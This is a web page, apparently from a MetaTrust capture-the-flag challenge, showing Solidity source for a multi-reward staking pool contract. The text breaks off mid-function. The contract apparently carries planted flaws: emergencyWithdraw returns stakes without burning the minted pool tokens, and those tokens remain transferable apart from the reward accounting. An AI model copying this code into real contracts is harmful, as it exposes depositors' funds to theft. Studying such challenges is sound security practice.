<h5 id="StakingPools-MT-sol"><a href="#StakingPools-MT-sol" class="headerlink" title="StakingPools_MT.sol"></a>StakingPools_MT.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ERC20.sol&quot;;</span><br><span class="line">/*</span><br><span class="line">@author: Daniel Tan@MetaTrust Labs</span><br><span class="line">*/</span><br><span class="line">/**</span><br><span class="line"> * @dev Contract module that helps prevent reentrant calls to a function.</span><br><span class="line"> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].</span><br><span class="line"> */</span><br><span class="line">abstract contract ReentrancyGuard &#123;</span><br><span class="line">    uint256 private constant _NOT_ENTERED = 1;</span><br><span class="line">    uint256 private constant _ENTERED = 2;</span><br><span class="line"></span><br><span class="line">    uint256 private _status;</span><br><span class="line"></span><br><span class="line">    constructor()  &#123;</span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier nonReentrant() &#123;</span><br><span class="line">        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);</span><br><span class="line"></span><br><span class="line">        _status = _ENTERED;</span><br><span class="line"></span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        _status = _NOT_ENTERED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract StakingPools is</span><br><span class="line">    Ownable,</span><br><span class="line">    ReentrancyGuard,</span><br><span class="line">    ERC20(&quot;Staking Pools&quot;, &quot;Pools&quot;)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // The address of the smart chef factory</span><br><span class="line">    address public BSC_CASTLE_FACTORY;</span><br><span class="line"></span><br><span class="line">    // Whether it is initialized</span><br><span class="line">    bool public isInitialized;</span><br><span class="line"></span><br><span class="line">    // Accrued token per share</span><br><span class="line">    mapping(ERC20 =&gt; uint256) public accTokenPerShare;</span><br><span class="line"></span><br><span class="line">    // The block number when staking starts.</span><br><span class="line">    uint256 public stakingBlock;</span><br><span class="line"></span><br><span class="line">    // The block number when staking end.</span><br><span class="line">    uint256 public stakingEndBlock;</span><br><span class="line"></span><br><span class="line">    // The block number when BSC mining ends.</span><br><span class="line">    uint256 public bonusEndBlock;</span><br><span class="line"></span><br><span class="line">    // The block number when BSC mining starts.</span><br><span class="line">    uint256 public startBlock;</span><br><span class="line"></span><br><span class="line">    // The block number of the last pool update</span><br><span class="line">    uint256 public lastRewardBlock;</span><br><span class="line"></span><br><span class="line">    // Whether the pool&#x27;s staked token balance can be remove by owner</span><br><span class="line">    bool private isRemovable;</span><br><span class="line"></span><br><span class="line">    // BSC tokens created per block.</span><br><span class="line">    mapping(ERC20 =&gt; uint256) public rewardPerBlock;</span><br><span class="line"></span><br><span class="line">    // The precision factor</span><br><span class="line">    mapping(ERC20 =&gt; uint256) public PRECISION_FACTOR;</span><br><span class="line"></span><br><span class="line">    // The reward token</span><br><span class="line">    ERC20[] public rewardTokens;</span><br><span class="line"></span><br><span class="line">    // The staked token</span><br><span class="line">    ERC20 public stakedToken;</span><br><span class="line"></span><br><span class="line">    // Info of each user that stakes tokens (stakedToken)</span><br><span class="line">    mapping(address =&gt; UserInfo) public userInfo;</span><br><span class="line"></span><br><span class="line">    struct UserInfo &#123;</span><br><span class="line">        uint256 amount; // How many staked tokens the user has provided</span><br><span class="line">        uint256 lastStakingBlock;</span><br><span class="line">        mapping(ERC20 =&gt; uint256) rewardDebt; // Reward debt</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event AdminTokenRecovery(address tokenRecovered, uint256 amount);</span><br><span class="line">    event Deposit(address indexed user, uint256 amount);</span><br><span class="line">    event EmergencyWithdraw(address indexed user, uint256 amount);</span><br><span class="line">    event NewStartAndEndBlocks(uint256 startBlock, uint256 endBlock);</span><br><span class="line">    event NewRewardPerBlock(uint256 rewardPerBlock, ERC20 token);</span><br><span class="line">    event RewardsStop(uint256 blockNumber);</span><br><span class="line">    event Withdraw(address indexed user, uint256 amount);</span><br><span class="line">    event NewRewardToken(ERC20 token, uint256 rewardPerBlock, uint256 p_factor);</span><br><span class="line">    event RemoveRewardToken(ERC20 token);</span><br><span class="line">    event NewStakingBlocks(uint256 startStakingBlock, uint256 endStakingBlock);</span><br><span class="line"></span><br><span class="line">    constructor()  &#123;</span><br><span class="line">        BSC_CASTLE_FACTORY = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Initialize the contract</span><br><span class="line">     * @param _stakedToken: staked token address</span><br><span class="line">     * @param _rewardToken: reward token address</span><br><span class="line">     * @param _rewardPerBlock: reward per block (in rewardToken)</span><br><span class="line">     * @param _startBlock: start block</span><br><span class="line">     * @param _bonusEndBlock: end block</span><br><span class="line">     * @param _admin: admin address with ownership</span><br><span class="line">     */</span><br><span class="line">    function initialize(</span><br><span class="line">        ERC20 _stakedToken,</span><br><span class="line">        ERC20[] memory _rewardTokens,</span><br><span class="line">        uint256[] memory _rewardPerBlock,</span><br><span class="line">        uint256[] memory _startEndBlocks,</span><br><span class="line">        uint256[] memory _stakingBlocks</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(!isInitialized, &quot;Already initialized&quot;);</span><br><span class="line">        require(msg.sender == BSC_CASTLE_FACTORY, &quot;Not factory&quot;);</span><br><span class="line">        require(</span><br><span class="line">            _rewardTokens.length == _rewardPerBlock.length,</span><br><span class="line">            &quot;Mismatch length&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // Make this contract initialized</span><br><span class="line">        isInitialized = true;</span><br><span class="line"></span><br><span class="line">        stakedToken = _stakedToken;</span><br><span class="line">        rewardTokens = _rewardTokens;</span><br><span class="line">        startBlock = _startEndBlocks[0];</span><br><span class="line">        bonusEndBlock = _startEndBlocks[1];</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            _stakingBlocks[0] &lt; _stakingBlocks[1],</span><br><span class="line">            &quot;Staking block exceeds end staking block&quot;</span><br><span class="line">        );</span><br><span class="line">        stakingBlock = _stakingBlocks[0];</span><br><span class="line">        stakingEndBlock = _stakingBlocks[1];</span><br><span class="line"></span><br><span class="line">        uint256 decimalsRewardToken;</span><br><span class="line">        for (uint256 i = 0; i &lt; _rewardTokens.length; i++) &#123;</span><br><span class="line">            decimalsRewardToken = uint256(_rewardTokens[i].decimals());</span><br><span class="line">            require(decimalsRewardToken &lt; 30, &quot;Must be inferior to 30&quot;);</span><br><span class="line">            PRECISION_FACTOR[_rewardTokens[i]] = uint256(</span><br><span class="line">                10**(uint256(30)- decimalsRewardToken)</span><br><span class="line">            );</span><br><span class="line">            rewardPerBlock[_rewardTokens[i]] = _rewardPerBlock[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Set the lastRewardBlock as the startBlock</span><br><span class="line">        lastRewardBlock = startBlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Deposit staked tokens and collect reward tokens (if any)</span><br><span class="line">     * @param _amount: amount to withdraw (in rewardToken)</span><br><span class="line">     */</span><br><span class="line">    function deposit(uint256 _amount) external nonReentrant &#123;</span><br><span class="line">        UserInfo storage user = userInfo[msg.sender];</span><br><span class="line"></span><br><span class="line">        require(stakingBlock &lt;= block.number, &quot;Staking has not started&quot;);</span><br><span class="line">        require(stakingEndBlock &gt;= block.number, &quot;Staking has ended&quot;);</span><br><span class="line"></span><br><span class="line">        _updatePool();</span><br><span class="line"></span><br><span class="line">        if (user.amount &gt; 0) &#123;</span><br><span class="line">            uint256 pending;</span><br><span class="line">            for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">                pending = user</span><br><span class="line">                .amount</span><br><span class="line">                * (accTokenPerShare[rewardTokens[i]])</span><br><span class="line">                / (PRECISION_FACTOR[rewardTokens[i]])</span><br><span class="line">                - (user.rewardDebt[rewardTokens[i]]);</span><br><span class="line">                if (pending &gt; 0) &#123;</span><br><span class="line">                    if (pending &gt; ERC20(rewardTokens[i]).balanceOf(address(this))) &#123;</span><br><span class="line">                        pending = ERC20(rewardTokens[i]).balanceOf(address(this));</span><br><span class="line">                    &#125;</span><br><span class="line">                    ERC20(rewardTokens[i]).transfer(</span><br><span class="line">                        address(msg.sender),</span><br><span class="line">                        pending</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (_amount &gt; 0) &#123;</span><br><span class="line">            user.amount = user.amount + (_amount);</span><br><span class="line">            ERC20(stakedToken).transferFrom(</span><br><span class="line">                address(msg.sender),</span><br><span class="line">                address(this),</span><br><span class="line">                _amount</span><br><span class="line">            );</span><br><span class="line">            _mint(address(msg.sender), _amount);</span><br><span class="line">        &#125;</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            user.rewardDebt[rewardTokens[i]] = user</span><br><span class="line">            .amount</span><br><span class="line">             * (accTokenPerShare[rewardTokens[i]])</span><br><span class="line">             / (PRECISION_FACTOR[rewardTokens[i]]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        user.lastStakingBlock = block.number;</span><br><span class="line"></span><br><span class="line">        emit Deposit(msg.sender, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Withdraw staked tokens and collect reward tokens</span><br><span class="line">     * @param _amount: amount to withdraw (in rewardToken)</span><br><span class="line">     */</span><br><span class="line">    function withdraw(uint256 _amount) external nonReentrant &#123;</span><br><span class="line">        UserInfo storage user = userInfo[msg.sender];</span><br><span class="line">        require(user.amount &gt;= _amount, &quot;Amount to withdraw too high&quot;);</span><br><span class="line">        // require(stakingEndBlock + 3600 * 24 * 7 &gt;= block.number, &quot;Withdraw has ended&quot;);</span><br><span class="line"></span><br><span class="line">        _updatePool();</span><br><span class="line"></span><br><span class="line">        // uint256 pending = user.amount * (accTokenPerShare) /  (PRECISION_FACTOR) - (user.rewardDebt);</span><br><span class="line">        uint256 pending;</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            pending = user</span><br><span class="line">            .amount</span><br><span class="line">            * (accTokenPerShare[rewardTokens[i]])</span><br><span class="line">            / (PRECISION_FACTOR[rewardTokens[i]])</span><br><span class="line">            - (user.rewardDebt[rewardTokens[i]]);</span><br><span class="line">            if (pending &gt; 0) &#123;</span><br><span class="line">                if (pending &gt; ERC20(rewardTokens[i]).balanceOf(address(this))) &#123;</span><br><span class="line">                    pending = ERC20(rewardTokens[i]).balanceOf(address(this));</span><br><span class="line">                &#125;</span><br><span class="line">                ERC20(rewardTokens[i]).transfer(address(msg.sender), pending);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (_amount &gt; 0) &#123;</span><br><span class="line">            user.amount = user.amount - (_amount);</span><br><span class="line">            _burn(address(msg.sender), _amount);</span><br><span class="line">            ERC20(stakedToken).transfer(address(msg.sender), _amount);</span><br><span class="line">            //_burn(address(msg.sender),_amount);</span><br><span class="line">        &#125;</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            user.rewardDebt[rewardTokens[i]] = user</span><br><span class="line">            .amount</span><br><span class="line">             * (accTokenPerShare[rewardTokens[i]])</span><br><span class="line">             /  (PRECISION_FACTOR[rewardTokens[i]]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Withdraw(msg.sender, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Withdraw staked tokens without caring about rewards rewards</span><br><span class="line">     * @dev Needs to be for emergency.</span><br><span class="line">     */</span><br><span class="line">    function emergencyWithdraw() external nonReentrant &#123;</span><br><span class="line">        UserInfo storage user = userInfo[msg.sender];</span><br><span class="line">        uint256 amountToTransfer = user.amount;</span><br><span class="line">        user.amount = 0;</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            user.rewardDebt[rewardTokens[i]] = 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (amountToTransfer &gt; 0) &#123;</span><br><span class="line">            ERC20(stakedToken).transfer(address(msg.sender), amountToTransfer);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit EmergencyWithdraw(msg.sender, user.amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Stop rewards</span><br><span class="line">     * @dev Only callable by owner. Needs to be for emergency.</span><br><span class="line">     */</span><br><span class="line">    function emergencyRewardWithdraw(uint256 _amount) external onlyOwner &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            ERC20(rewardTokens[i]).transfer(address(msg.sender), _amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Stop rewards</span><br><span class="line">     * @dev Only callable by owner</span><br><span class="line">     */</span><br><span class="line">    function stopReward() external onlyOwner &#123;</span><br><span class="line">        bonusEndBlock = block.number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice View function to see pending reward on frontend.</span><br><span class="line">     * @param _user: user address</span><br><span class="line">     * @return Pending reward for a given user</span><br><span class="line">     */</span><br><span class="line">    function pendingReward(address _user)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256[] memory, ERC20[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        UserInfo storage user = userInfo[_user];</span><br><span class="line">        uint256 stakedTokenSupply = stakedToken.balanceOf(address(this));</span><br><span class="line">        uint256[] memory userPendingRewards = new uint256[](</span><br><span class="line">            rewardTokens.length</span><br><span class="line">        );</span><br><span class="line">        if (block.number &gt; lastRewardBlock &amp;&amp; stakedTokenSupply != 0) &#123;</span><br><span class="line">            uint256 multiplier = _getMultiplier(lastRewardBlock, block.number);</span><br><span class="line">            uint256 bscsReward;</span><br><span class="line">            uint256 adjustedTokenPerShare;</span><br><span class="line">            for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">                bscsReward = multiplier * (rewardPerBlock[rewardTokens[i]]);</span><br><span class="line">                adjustedTokenPerShare = accTokenPerShare[rewardTokens[i]] + (</span><br><span class="line">                    bscsReward * (PRECISION_FACTOR[rewardTokens[i]]) /  (</span><br><span class="line">                        stakedTokenSupply</span><br><span class="line">                    )</span><br><span class="line">                );</span><br><span class="line">                userPendingRewards[i] = user</span><br><span class="line">                .amount</span><br><span class="line">                * (adjustedTokenPerShare)</span><br><span class="line">                / (PRECISION_FACTOR[rewardTokens[i]])</span><br><span class="line">                - (user.rewardDebt[rewardTokens[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">            return (userPendingRewards, rewardTokens);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">                userPendingRewards[i] = user</span><br><span class="line">                .amount</span><br><span class="line">                * (accTokenPerShare[rewardTokens[i]])</span><br><span class="line">                / (PRECISION_FACTOR[rewardTokens[i]])</span><br><span class="line">                - (user.rewardDebt[rewardTokens[i]]); </span><br><span class="line">            &#125;                                           </span><br><span class="line">            return (userPendingRewards, rewardTokens);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice View function to see pending reward on frontend (categorized by rewardToken)</span><br><span class="line">     * @param _user: user address</span><br><span class="line">     * @return Pending reward for a given user</span><br><span class="line">     */</span><br><span class="line">    function pendingRewardByToken(address _user, ERC20 _token)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        (bool foundToken, uint256 tokenIndex) = findElementPosition(</span><br><span class="line">            _token,</span><br><span class="line">            rewardTokens</span><br><span class="line">        );</span><br><span class="line">        if (!foundToken) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        UserInfo storage user = userInfo[_user];</span><br><span class="line">        uint256 stakedTokenSupply = stakedToken.balanceOf(address(this));</span><br><span class="line">        uint256 userPendingReward;</span><br><span class="line">        if (block.number &gt; lastRewardBlock &amp;&amp; stakedTokenSupply != 0) &#123;</span><br><span class="line">            uint256 multiplier = _getMultiplier(lastRewardBlock, block.number);</span><br><span class="line">            uint256 bscsReward = multiplier * (rewardPerBlock[_token]);</span><br><span class="line">            uint256 adjustedTokenPerShare = accTokenPerShare[_token] + (</span><br><span class="line">                bscsReward * (PRECISION_FACTOR[_token]) /  (</span><br><span class="line">                    stakedTokenSupply</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">            userPendingReward = user</span><br><span class="line">            .amount</span><br><span class="line">            * (adjustedTokenPerShare)</span><br><span class="line">            / (PRECISION_FACTOR[_token])</span><br><span class="line">            - (user.rewardDebt[_token]);</span><br><span class="line">            return userPendingReward;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return</span><br><span class="line">                user</span><br><span class="line">                    .amount</span><br><span class="line">                    * (accTokenPerShare[_token])</span><br><span class="line">                  